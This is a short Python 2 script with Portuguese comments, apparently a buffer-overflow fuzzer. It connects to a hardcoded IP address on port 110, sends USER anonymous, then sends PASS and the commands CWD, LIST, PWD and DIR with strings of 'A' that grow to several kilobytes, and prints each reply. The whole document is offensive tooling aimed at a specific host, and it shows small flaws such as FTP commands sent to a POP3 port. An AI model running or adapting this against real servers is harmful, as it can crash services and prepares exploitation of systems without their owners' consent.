#/usr/bin/python
import socket
#Gera lista incremental de caracteres
buffer=["A"]
contador=100
while len(buffer) <= 30:
    buffer.append("A"*contador)
    contador=contador+200

comandos=["CWD","LIST","PWD","DIR"]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("195.177.177.17",110))
r = s.recv(1024)
print r

for comando in comandos:
    for string in buffer:
        print "Fuzzinf em PASS com o comando %s e  %s bytes" %(comando,len(string))

        s.send("USER anonymous\r\n")
        r = s.recv(1024)
        print r
        s.send('PASS '+string+'\r\n')
        r = s.recv(1024)
        print r
        s.send('%s %s\r\n'%(comando,string))
        r = s.recv(1024)
        print r

